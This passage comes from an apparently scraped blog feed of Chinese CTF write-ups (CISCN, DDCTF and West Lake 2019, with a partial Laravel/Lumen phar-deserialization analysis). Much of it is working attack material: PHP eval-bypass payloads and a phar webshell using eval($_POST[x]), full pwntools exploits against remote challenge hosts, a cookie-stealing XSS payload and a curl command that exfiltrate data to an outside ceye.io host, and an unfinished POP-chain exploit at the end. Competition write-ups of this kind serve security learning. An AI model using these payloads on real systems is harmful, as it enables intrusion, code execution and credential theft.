preg_match_all('/[a-zA-Z_x7f-xff][a-zA-Z_0-9x7f-xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(\"请不要输入奇奇怪怪的函数\"); &#125; &#125; //帮你算出答案 eval('echo '.$content.';');&#125; 可以看到他会限制输入长度小于80，然后匹配黑名单，接着就是找函数，只有白名单的函数才可以继续执行到了这里似乎无解，查看白名单发现有个base_convert函数，进制转换，思考一下，到了&gt;=36进制是可以将字母显示出来的，我们可以考虑一下通过进制转换去getshell接下来就是找个在线网站转一下进制然后直接就行1234#phpinfobase_convert(55490343972,10,36)()#system('ls')base_convert(1751504350,10,36)(base_convert(784,10,36)) 获得了目录以后，就是最重要的读文件了，这里我们需要引入其他参数去打破字符长度的限制最后payload123//这里利用了&#123;&#125;去替代[]进行数组索引$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php//相当于：$pi=_GET;($_GET[pi])($_GET[abs]) RefSpace一进去可以看到一个文件上传的点?route=app/index，利用伪协议将一堆文件读出来，index.php，app/flag.php，app/index.php，backup.zip，然后robots.txt还有一个文件上传的点Up10aD.php ，测试一下发现只能上传jpg和gif文件，尝试了一下截断，一直不成功，最后只能结合文件包含的点和phar协议去进行getshell12$p = new PharData(dirname(__FILE__).'/phartest.aaa', 0,'phartest',Phar::ZIP) ;$p-&gt;addFromString('testfile.php', '&lt;?php phpinfo(); eval($_POST[x])?&gt;'); 将生成的文件改下后缀发上去就能成功getshell了，将所有文件一把梭全部下下来，看下openbase_dir有个ctf目录，继续读看见有个sdk.php和ixed.lin下下来…就做不下了…菜鸡逆向巨差…只知道他是一个sha1加密，有个flag.txt的密文，但是直接在线解密是不可能的，sdk.php已经提示是商业加密了……赛后问了大佬，说可以用反射去做，还是太菜了……1234567use interesting\\FlagSDK; $sdk = new FlagSDK(); $ref = new ReflectionClass($sdk); $instance = $ref-&gt;newInstance();$method = $ref-&gt;getmethod(\"getHash\");$method-&gt;setAccessible(true);echo $method-&gt;invoke($instance); 然后就能拿到getHash出来的值，接下来利用不同的命名空间达到重新定义函数的目的（就是在函数同名的时候，系统会优先调用本命名空间里面的同名函数）123456namespace interesting;function sha1($key)&#123; return \"a356bc8d9d3e69beea3c15d40995f395425e7813\";&#125;$sdk = new \\interesting\\FlagSDK();var_dump($sdk-&gt;verify(\"a\")); 反射这波利用还是很秀的，涨姿势了2333 cryptopuzzle一道集合了脑洞高数和大物的题123456789101112Q0解第一个4元4次方程得到：a1 = 0xfa6a2 = 0xbeda3 = 0x9c7a4 = 0xa00整合下：fa6bed9c7a00Q1: 解出0x1924dd7Q2：手撕算积分：0x1e14Q3: 磁通手撕算出: 0x48d0Q4: 三重积分手撕：0x9d80组合在一起：flag&#123;01924dd7-1e14-48d0-9d80-fa6bed9c7a00&#125; warmup这道题是AES CTR加密，这个加密方式有个缺陷，可以主动攻击，改明文，如果后续的内容不受影响，就能进行攻击连接服务器，首先我们先什么都不输入，获得第一条密文c1，就是flag的密文可知密文是48个字节接下来输入16个1，获得第二条密文c2然后32个1，得到第三条密文c3最后48个1，得到第四条密文c4接下来就是c1分段对应异或得到明文1234567891011121314151617181920212223242526272829303132333435#nulls1 = \"199b7d9256bdcaeff34ee57ed2d6c9646bd185e48e716c5385ab36ff820de3928a8844bc0b48fe93b2002c1c5a4d2c2f\"#16*1s2 = \"4ec62dc41cb5cbe8f11ee679d4caca606cd8c9b7c0296f488fa932ac9816e3c4db880bb95a4bffdbb21e1c7f717d184a5e960812355a6570a55b25536565f0d9\"#32*1s3 = \"4ec62dc41cb5cbe8f11ee679d4caca603b8599e18a216e4f8df931ab9e0ae0c0dc8147ea1413fcc0b81c182c6b66181c0f96471764596438a54515304e55c4bc41c88702fc6d06f14f2d9e8ef115d2e7\"#64*1s4 = \"4ec62dc41cb5cbe8f11ee679d4caca603b8599e18a216e4f8df931ab9e0ae0c08bdc17bc5e1bfdc7ba4c1b2b6d7a1b18089f0b442a016723af471163544ec4ea10c8c807ad6e07b94f33aeedda25e682862a97e2c075dc4013f1f1a836ac9c86\"#cutc1 = s1[:32]c2 = s1[32:64]c3 = s1[64:]b1 = s2[:32]b2 = s3[32:64]b3 = s4[64:96]a1 = [0x19, 0x9b, 0x7d, 0x92, 0x56, 0xbd, 0xca, 0xef, 0xf3, 0x4e, 0xe5, 0x7e, 0xd2, 0xd6, 0xc9, 0x64]a2 = [0x6b, 0xd1, 0x85, 0xe4, 0x8e, 0x71, 0x6c, 0x53, 0x85, 0xab, 0x36, 0xff, 0x82, 0x0d, 0xe3, 0x92]a3 = [0x8a, 0x88, 0x44, 0xbc, 0x0b, 0x48, 0xfe, 0x93, 0xb2, 0x00, 0x2c, 0x1c, 0x5a, 0x4d, 0x2c, 0x2f]b = [0x4e, 0xc6, 0x2d, 0xc4, 0x1c, 0xb5, 0xcb, 0xe8, 0xf1, 0x1e, 0xe6, 0x79, 0xd4, 0xca, 0xca, 0x60]c = [0x3b, 0x85, 0x99, 0xe1, 0x8a, 0x21, 0x6e, 0x4f, 0x8d, 0xf9, 0x31, 0xab, 0x9e, 0x0a, 0xe0, 0xc0]d = [0x8b, 0xdc, 0x17, 0xbc, 0x5e, 0x1b, 0xfd, 0xc7, 0xba, 0x4c, 0x1b, 0x2b, 0x6d, 0x7a, 0x1b, 0x18]# for i in range(16):# k = c3[i*2:i*2+2]# print \"0x\"+k+\",\",for i in range(16): print chr(a1[i]^b[i]^ord('1')),for i in range(16): print chr(a2[i]^c[i]^ord('1')),for i in range(16):print chr(a3[i]^d[i]^ord('1')), pwnyour_pwn64位程序 ，保护全开IDA分析可以发现程序存在一个任意地址读和任意地址写的漏洞，所以就可以泄漏出真实地址，然后onegadget一把梭搞定。因为泄漏与写入都是每次一个字节的，所以需要泄漏6次拼出真实地址，进而循环6次写入onegadget，不过for循环有41次，完全足够。gdb调试得到__libc_start_main+240到v4[0]的偏移循环6次得到__libc_start_main的地址算出偏移得到onegadget地址同样的方法得到返回地址于是v4[0]的偏移循环6次写到onegadget，exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#coding:utf-8from pwn import *context.log_level = 'debug'#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen(\"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'\".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,\"b *&#123;&#125;\".format(hex(addr))) p = process('./pwn')# p = remote(\"1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com\",\"57856\")elf = ELF('./pwn')libc = elf.libcp.recvuntil('name:')p.sendline('n0va')p.recvuntil('input index\\n')p.sendline('632')p.recvuntil('now value(hex) ')a = int(p.recv(2),16)print hex(a)p.recvuntil('input new value\\n')p.sendline('1')p.recvuntil('input index\\n')p.sendline('633')p.recvuntil('now value(hex) ')b = (int(p.recvuntil('\\n')[:-1],16))&amp;0xffprint hex(b)p.recvuntil('input new value\\n')p.sendline('1')p.recvuntil('input index\\n')p.sendline('634')p.recvuntil('now value(hex) ')c = int(p.recvuntil('\\n')[:-1],16)&amp;0xffprint hex(c)p.recvuntil('input new value\\n')p.sendline('1')p.recvuntil('input index\\n')p.sendline('635')p.recvuntil('now value(hex) ')d = int(p.recvuntil('\\n')[:-1],16)&amp;0xffprint hex(d)p.recvuntil('input new value\\n')p.sendline('1')p.recvuntil('input index\\n')p.sendline('636')p.recvuntil('now value(hex) ')e = int(p.recvuntil('\\n')[:-1],16)&amp;0xffprint hex(e)p.recvuntil('input new value\\n')p.sendline('1')p.recvuntil('input index\\n')p.sendline('637')p.recvuntil('now value(hex) ')f = int(p.recvuntil('\\n')[:-1],16)&amp;0xffprint hex(f)p.recvuntil('input new value\\n')p.sendline('1')print hex(a),hex(b),hex(c),hex(d),hex(e),hex(f)libc_start_main = hex(f)[2:] + hex(e)[2:] + hex(d)[2:] + hex(c)[2:] + hex(b)[2:] + hex(a)[2:]libc_main = int(libc_start_main,16)-240print hex(int(libc_start_main,16))print hex(libc_main)offset = libc_main - libc.symbols['__libc_start_main']one_gadget = offset + 0x45216print \"one_gadget--&gt; \" + hex(one_gadget)# system_addr = libc.symbols['system'] + offset# binsh_addr = libc.search(\"/bin/sh\").next() + offset# print \"system_addr--&gt; \" + hex(system_addr)# print \"binsh_addr--&gt; \" + hex(binsh_addr)a = one_gadget&amp;0xffb = one_gadget&gt;&gt;8&amp;0xffc = one_gadget&gt;&gt;16&amp;0xffd = one_gadget&gt;&gt;24&amp;0xffe = one_gadget&gt;&gt;32&amp;0xfff = one_gadget&gt;&gt;40&amp;0xffprint hex(a),hex(b),hex(c),hex(d),hex(e),hex(f)p.recvuntil('input index\\n')p.sendline('344')p.recvuntil('input new value\\n')p.sendline(str(a))p.recvuntil('input index\\n')p.sendline('345')p.recvuntil('input new value\\n')p.sendline(str(b))p.recvuntil('input index\\n')p.sendline('346')p.recvuntil('input new value\\n')p.sendline(str(c))p.recvuntil('input index\\n')p.sendline('347')p.recvuntil('input new value\\n')p.sendline(str(d))p.recvuntil('input index\\n')p.sendline('348')p.recvuntil('input new value\\n')p.sendline(str(e))p.recvuntil('input index\\n')p.sendline('349')p.recvuntil('input new value\\n')p.sendline(str(f))p.recvuntil('input index\\n')p.sendline('-4')p.sendline('40')p.recvuntil('do you want continue(yes/no)? \\n')p.sendline('no')p.interactive() baby_pwn32位程序 ，只开了NX，打开IDA有一个栈溢出漏洞，没有后门函数，其它的也没有什么可用的，这么干净的栈溢出很容易就想到了runtime_resolve。exp如下1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal','-x','bash','-c']context(arch='amd64', os='linux')# p = process('./pwn')p = remote(\"da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com\",\"33865\")elf = ELF('./pwn')read_plt = elf.plt['read']alarm_got = elf.got['alarm']# write_plt = elf.plt['write']bss_addr = elf.bss()bss_stage1 = 0x800 + bss_addrbss_stage2 = 80 + bss_stage1ppp_ret = 0x080485d9pop_ebp = 0x080485dbleave_ret = 0x08048448#read(0,bss_addr,100)payload = 'a'*44payload += p32(read_plt)payload += p32(ppp_ret)payload += p32(0)payload += p32(bss_stage1)payload += p32(100)payload += p32(pop_ebp)payload += p32(bss_stage1)payload += p32(leave_ret)# p.recvuntil('Welcome to XDCTF2015~!\\n')# gdb.attach(p,\"b *0x08048546\")# pause()p.sendline(payload)cmd = '/bin/sh'plt_0 = 0x8048380rel_plt = 0x804833cindex_offset = (bss_stage1+28) - rel_plt# write_got = elf.got['write']dynsym = 0x080481dc #objdump -s -j .dynsym bofdynstr = 0x804827c #objdump -s -j .dynstr boffake_sym_addr = bss_stage1+36align = 0x10 -((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym&lt;&lt;8) | 0x7fack_reloc = p32(alarm_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstrst_name = (fake_sym_addr + 0x10) - dynstr #加0x10是因为Elf32_Sym的大小为0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload = 'aaaa'payload += p32(plt_0)payload += p32(index_offset)payload += 'aaaa'payload += p32(bss_stage2)payload += 'aaaaaaaa'payload += fack_reloc #(bss_stage1+28)的位置payload += 'b'*alignpayload += fake_sym #(bss_stage1+36)的位置 payload += \"system\\x00\"payload += 'a'*(80-len(payload))payload += cmd + '\\x00'# payload += 'a'*(100-len(payload))p.sendline(payload)p.interactive() reeasygo在jmp start_0的下一条汇编下断，r停下在寄存器里就能看到flag了","comments":true,"permalink":"https://xi4or0uji.github.io/2019/04/22/2019-全国大学生信息安全竞赛-writeup/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019 DDCTF web writeup","date":"2019-04-18T16:00:00.000Z","path":"2019/04/19/2019-DDCTF-web-writeup/","text":"这一届的比赛web题虽然脑洞略大，但是还是有很多收获的，记录一下 滴一题大脑洞题……首先进去题目看到参数jpg后面有段字符串，很像base64尝试一下base64解密，又出来一段base64，再解密一次是十六进制，转成字符串是flag.jpg在这里我们可以猜测一下后台可能会读文件出来，我们倒序加密一下index.php去请求看一下回应确实可以拿出index.php的源码12345678910111213141516171819202122232425&lt;?php/* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */error_reporting(E_ALL || ~E_NOTICE);header('content-type:text/html;charset=utf-8');if(! isset($_GET['jpg'])) header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));echo '&lt;title&gt;'.$_GET['jpg'].'&lt;/title&gt;';$file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file);echo $file.'&lt;/br&gt;';$file = str_replace(\"config\",\"!\", $file);echo $file.'&lt;/br&gt;';$txt = base64_encode(file_get_contents($file));echo \"&lt;img src='data:image/gif;base64,\".$txt.\"'&gt;&lt;/img&gt;\";/* * Can you find the flag file? * */?&gt; 这里就开始第一个大脑洞了……我们看一下源码开头注释的那篇博客可以看到这里有个文件名，访问一下会看到一个文件名注意一下index.php里面的正则，我们要加密的字符串是这个f1agconfigddctf.php我们读取一下这个文件的内容1234567891011121314151617&lt;?phpinclude('config.php');$k = 'hello';extract($_GET);if(isset($uid))&#123; $content=trim(file_get_contents($k)); if($uid==$content) &#123; echo $flag; &#125; else &#123; echo'hello'; &#125;&#125;?&gt; 剩下的就是变量覆盖漏洞了?uid=&amp;k= 签到题index.js可以看到一些验证12345678910111213141516171819function auth() &#123; $.ajax(&#123; type: \"post\", url:\"http://117.51.158.44/app/Auth.php\", contentType: \"application/json;charset=utf-8\", dataType: \"json\", beforeSend: function (XMLHttpRequest) &#123; XMLHttpRequest.setRequestHeader(\"didictf_username\", \"\"); &#125;, success: function (getdata) &#123; console.log(getdata); if(getdata.data !== '') &#123; document.getElementById('auth').innerHTML = getdata.data; &#125; &#125;,error:function(error)&#123; console.log(error); &#125; &#125;);&#125; 访问http://117.51.158.44/app/Auth.php同时加上didictf_username的头部，值为admin就能拿到源码了123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153Application.phpclass Application&#123; var $path = ''; public function response($data, $errMsg = 'success') &#123; $ret = ['errMsg' =&gt; $errMsg, 'data' =&gt; $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; &#125; public function auth() &#123; $DIDICTF_ADMIN = 'admin'; if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) &amp;&amp; $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) &#123; $this-&gt;response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'); return TRUE; &#125;else&#123; $this-&gt;response('抱歉，您没有登陆权限，请获取权限后访问-----','error'); exit(); &#125; &#125; private function sanitizepath($path) &#123; $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\\\','',$path); return $path; &#125; public function __destruct() &#123; if(empty($this-&gt;path)) &#123; exit(); &#125;else&#123; $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) &#123; exit(); &#125; $this-&gt;response($data=file_get_contents($path),'Congratulations'); &#125; exit(); &#125;&#125;Session.phpinclude 'Application.php';class Session extends Application&#123; //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration = 7200; var $cookie_name = 'ddctf_id'; var $cookie_path = ''; var $cookie_domain = ''; var $cookie_secure = FALSE; var $activity = \"DiDiCTF\"; public function index() &#123; if(parent::auth()) &#123; $this-&gt;get_key(); if($this-&gt;session_read()) &#123; $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); &#125;else&#123; $this-&gt;session_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); &#125; &#125; &#125; private function get_key() &#123; //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents('../config/key.txt'); &#125; public function session_read() &#123; if(empty($_COOKIE)) &#123; return FALSE; &#125; $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) &#123; parent::response(\"session not found\",'error'); return FALSE; &#125; $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) &#123; parent::response(\"the cookie data not match\",'error'); return FALSE; &#125; $session = unserialize($session); if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent']))&#123; return FALSE; &#125; if(!empty($_POST[\"nickname\"])) &#123; $arr = array($_POST[\"nickname\"],$this-&gt;eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k =&gt; $v) &#123; $data = sprintf($data,$v); &#125; parent::response($data,\"Welcome\"); &#125; if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) &#123; parent::response('the ip addree not match'.'error'); return FALSE; &#125; if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) &#123; parent::response('the user agent not match','error'); return FALSE; &#125; return TRUE; &#125; private function session_create() &#123; $sessionid = ''; while(strlen($sessionid) &lt; 32) &#123; $sessionid .= mt_rand(0,mt_getrandmax()); &#125; $userdata = array( 'session_id' =&gt; md5(uniqid($sessionid,TRUE)), 'ip_address' =&gt; $_SERVER['REMOTE_ADDR'], 'user_agent' =&gt; $_SERVER['HTTP_USER_AGENT'], 'user_data' =&gt; '', ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); &#125;&#125; 审计源码可以看到12345678if(!empty($_POST[\"nickname\"])) &#123; $arr = array($_POST[\"nickname\"],$this-&gt;eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k =&gt; $v) &#123; $data = sprintf($data,$v); &#125; parent::response($data,\"Welcome\");&#125; 可以看到这里有个sprintf函数，同时值可控，这里是个格式化字符串漏洞，我们可以传个admin%s去把key拿出来，是EzblrbNS再接下来就是反序列化的利用了，注意一下路径是flag.txt，也要记得绕一下waf，payload12345$app = new Application();echo serialize($app);$session = \"O:11:\\\"Application\\\":1:&#123;s:4:\\\"path\\\";s:21:\\\"....//config/flag.txt\\\";&#125;77cd55a8d29df4f005f85e536d876525\";$key = \"EzblrbNS\";echo md5($key.$session); upload img考gd库对于图片的渲染漏洞，参考：https://xz.aliyun.com/t/416 大吉大利 今晚吃鸡考了整数溢出和脚本，下单和付款不是同一个整数类型，溢出让票价变小，然后就是大号打小号了12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding:utf-8import requests,base64,timedef main(): cookie1 = &#123; \"user_name\": \"xiaorouji\", \"REVEL_SESSION\": \"8675885b988d1b153da635cef40710bb\" &#125; for i in xrange(3270,9000): # print i register_url = \"http://117.51.147.155:5050/ctf/api/register?name=&#123;&#125;&amp;password=111111111\".format(i) register = requests.get(url=register_url).content login_url = \"http://117.51.147.155:5050//ctf/api/login?name=&#123;&#125;&amp;password=111111111\".format(i) login = requests.get(url=login_url).headers if len(str(login))&gt;200: print \"[+]---------------------------------------\" session = str(login).split(\"=\")[3][:32] cookie = &#123; \"user_name\": str(i), \"REVEL_SESSION\": session &#125; ticket_url = \"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967297\" ticket = requests.get(url=ticket_url,cookies=cookie).content bill_id = ticket[32:68] pay_url = \"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&#123;&#125;\".format(bill_id) pay = requests.get(url=pay_url,cookies=cookie).content pay = str(pay) if \"hash_val\" in pay: robot_token = pay.split(\":\")[3][1:33] robot_id = pay.split(\":\")[4] robot_id = str(robot_id).split(\",\")[0] if \"your_id\" in pay: robot_token = pay.split(\":\")[4][1:33] robot_id = pay.split(\":\")[3] robot_id = str(robot_id).split(\",\")[0] remove_url = \"http://117.51.147.155:5050/ctf/api/remove_robot?id=&#123;&#125;&amp;ticket=&#123;&#125;\".format(robot_id,robot_token) remove = requests.get(url=remove_url,cookies=cookie1).content flag_url = \"http://117.51.147.155:5050/ctf/api/get_flag\" flag = requests.get(url=flag_url,cookies=cookie1).content print \"token: \" + robot_token + \" \" + \"id: \" + robot_id print flag if str(flag)[20:21] == \"0\": breakif __name__ == '__main__': main() mysql弱口令这题利用mysql loal data infile的漏洞去进行任意文件读取，改下GitHub的脚本和agent.py就能拿到flag了https://github.com/Gifts/Rogue-MySql-Server通过读/root/.bash_history文件可以读到flag目录：/var/lib/mysql/security/flag.ibd但是有个坑点，agent.py要改一下才能跑起来，题目其实不难，基础不牢，没能改成功agent.py，比赛没做出来是在遗憾1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#!/usr/bin/env python# -*- coding: utf-8 -*-# @Time : 12/1/2019 2:58 PM# @Author : fz# @Site :# @File : agent.py# @Software: PyCharmimport jsonfrom BaseHTTPServer import HTTPServer, BaseHTTPRequestHandlerfrom optparse import OptionParserfrom subprocess import Popen, PIPEclass RequestHandler(BaseHTTPRequestHandler): def do_GET(self): request_path = self.path print(\"\\n----- Request Start -----&gt;\\n\") print(\"request_path :\", request_path) print(\"UA :\", self.headers.getheaders('user-agent')) print(\"self.headers :\", self.headers) print(\"&lt;----- Request End -----\\n\") self.send_response(404) self.send_header(\"Set-Cookie\", \"foo=flag\") self.end_headers() result = self._func() return_str = \"mysqld\" self.wfile.write(return_str) # self.wfile.write(json.dumps(result)) def do_POST(self): request_path = self.path # print(\"\\n----- Request Start -----&gt;\\n\") print(\"request_path : %s\", request_path) request_headers = self.headers content_length = request_headers.getheaders('content-length') length = int(content_length[0]) if content_length else 0 # print(\"length :\", length) print(\"request_headers : %s\" % request_headers) print(\"content : %s\" % self.rfile.read(length)) # print(\"&lt;----- Request End -----\\n\") self.send_response(404) self.send_header(\"Set-Cookie\", \"foo=bar\") self.end_headers() result = self._func() return_str = \"mysqld\" self.wfile.write(return_str) # self.wfile.write(json.dumps(result)) def _func(self): netstat = Popen(['netstat', '-tlnp'], stdout=PIPE) netstat.wait() ps_list = netstat.stdout.readlines() result = [] for item in ps_list[2:]: tmp = item.split() Local_Address = tmp[3] Process_name = tmp[6] tmp_dic = &#123;'local_address': Local_Address, 'Process_name': Process_name&#125; result.append(tmp_dic) return result do_PUT = do_POST do_DELETE = do_GETdef main(): port = 8123 print('Listening on localhost:%s' % port) server = HTTPServer(('0.0.0.0', port), RequestHandler) server.serve_forever()if __name__ == \"__main__\": parser = OptionParser() parser.usage = ( \"Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data\\n\" \"Run:\\n\\n\") (options, args) = parser.parse_args() main()","comments":true,"permalink":"https://xi4or0uji.github.io/2019/04/19/2019-DDCTF-web-writeup/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019西湖论剑web writeup","date":"2019-04-10T16:00:00.000Z","path":"2019/04/11/2019西湖论剑web-writeup/","text":"比赛的时候刚好清明回家所以上线时间巨短，做了几个水题就比赛结束了2333，比赛一结束主办方就关环境只能口胡了……. 猜猜flag是什么扫一下后台能扫到ds_store泄露，恢复一下有1234yingyingying文件夹index.phpflage10adc3949ba59abbe56e057f20f883e 访问flag提示没有那么容易拿到flag，接着去扫e10adc3949ba59abbe56e057f20f883e居然还有.git泄露……..然后还原出来一个zip压缩包，index.php和lengzhu.jpg，刚好压缩包里面也有lengzhu.jpg，因此可以知道是明文攻击，这里有个坑点就是要用好压压缩才能进行攻击最后拿到hint的内容12code is 9faedd5999937171912159d28b219d86well ok ur good...By the way, flag saved in flag/seed.txt 然后放回网页会看到又来一个随机数，这里就是随机数安全的问题了，去爆破种子然后访问一下/flag/361945.txt就有flag了 breakout首先登陆进去然后就看见里面有个留言框，有个提交框，将url发给管理员，管理员会带上自己的token去查看，还有一个是执行命令的框，但是要有管理员的token在留言里面疯狂尝试发现在onerror后面加个换行符就能绕过了，payload12&lt;img src=x onerror=\"document.location='http://onsdtb.ceye.io/'+document.cookie\"&gt; 然后将访问一下提交框交个main.php给管理员看一下最后用拿到的token在执行框命令执行就行1command=curl http://onsdtb.ceye.io?$(cat /flag.txt|base64)&amp;exec=1 babyt3题目hint提示了dir.php，因为strpos写反了，用dir.php列出目录然后直接file=/ffffflag_1s_Her4就有flag了 blogwriteup：https://blog.dragonsector.pl/2018/07/google-ctf-2018-quals-bbs.htmlhttps://ctftime.org/writeup/10369","comments":true,"permalink":"https://xi4or0uji.github.io/2019/04/11/2019西湖论剑web-writeup/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"rips 2017","date":"2019-04-10T16:00:00.000Z","path":"2019/04/11/rips-2017/","text":"之前群里大佬说复现完了ph牛的code breaking可以去rips看一下，然后就去了 wish list","comments":true,"permalink":"https://xi4or0uji.github.io/2019/04/11/rips-2017/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"}]},{"title":"code breaking lumenserial","date":"2019-03-24T16:00:00.000Z","path":"2019/03/25/code-breaking-lumenserial/","text":"小菜鸡太菜了，只能复现 题目先审计源码，可以看到EditorController.php有个download函数12345678910111213private function download($url)&#123; $maxSize = $this-&gt;config['catcherMaxSize']; $limitExtension = array_map(function ($ext) &#123; return ltrim($ext, '.'); &#125;, $this-&gt;config['catcherAllowFiles']); $allowTypes = array_map(function ($ext) &#123; return \"image/&#123;$ext&#125;\"; &#125;, $limitExtension); $content = file_get_contents($url); $img = getimagesizefromstring($content); ......&#125; 可以看到这个函数里面有个file_get_contents函数，通过get方法传进去一个url，而且这个参数完全可控，因此我们可以利用它进行phar反序列化操作，而且文件上传的点还很容易找到，能直接上传图片。但是有个注意的是，php的版本是7.2，8能动态调用assert函数，还禁用了很多系统函数system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log，因此反序列化难度+++ 分析找pop链PendingBroadcast先看illuminate/boradcasting/PendingBroadcast.php这个文件123public function __destruct()&#123; $this-&gt;events-&gt;dispatch($this-&gt;event);&#125; 可以通过这个方法将一些类的__call方法调用出来 ValidGenerator在faker/src/Facker/ValidGenerator.php里面有个__call方法，这个方法里面调用了两个动态调用函数1234567891011public function __call($name, $arguments)&#123; $i = 0; do &#123; $res = call_user_func_array(array($this-&gt;generator, $name), $arguments); $i++; if ($i &gt; $this-&gt;maxRetries) &#123; throw new \\OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this-&gt;maxRetries)); &#125; &#125; while (!call_user_func($this-&gt;validator, $res)); return $res;&#125; 这个类里面传进去的name参数是不可控的，因此我们第一次调用$res = call_user_func_array(array($this-&gt;generator, $name)并不能如我们所愿实现任意命令，但是我们可以找到一个类，使上面调用的出来的结果可控，从而在第二次调用call_user_func($this-&gt;validator, $res)的时候实现控制。而且，name的值就是dispatch，由于在call_user_func_array里面，generator类中没有定义dispatch函数，因此会自动调用__call函数 Generatorfzaninotto/faker/src/Faker/Generator.php先看__call函数123public function __call($method, $attributes)&#123; return $this-&gt;format($method, $attributes);&#125; 跟进去format函数123public function format($formatter, $arguments = array())&#123; return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);&#125; formatter参数8可控，继续跟12345public function getFormatter($formatter)&#123; if (isset($this-&gt;formatters[$formatter])) &#123; return $this-&gt;formatters[$formatter]; &#125; ... 好了，这里我们能看到他的return值是一个数组的值，因此，我们先让第一次$this-&gt;getFormatter($formatter)返回的值是一个数组，数组值为getFormatter，然后由于call_user_func_array，他会再调用一次getFormatter方法，参数为空，而这个方法传空值时，就会返回第一个formatters成员的值 StaticInvocation接下来最后一步就是要找一个比较好的类了phpunit\\src\\Framework\\MockObject\\Stub\\ReturnCallback.php里面看invoke函数123public function invoke(Invocation $invocation)&#123; return \\call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters());&#125; invoke方法调用了call_user_func_array而且里面的两个参数都是反序列化的时候可以控制的，Invocation只是一个接口，找到那个类就能利用了找下类的方法123456class StaticInvocation implements Invocation, SelfDescribing&#123; public function getMethodName(): string&#123; return $this-&gt;methodName; &#125; &#125; 利用这个返回回到ValidGenreator中利用call_user_func就能成功完成攻击了 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?php/** * Created by PhpStorm. * User: Ariel * Date: 2019/4/8 * Time: 20:42 */namespace Illuminate\\Broadcasting&#123; class PendingBroadcast&#123; function __construct()&#123; $this-&gt;events = new \\Faker\\ValidGenerator(); $this-&gt;event = 'Ariel'; &#125; &#125;&#125;namespace 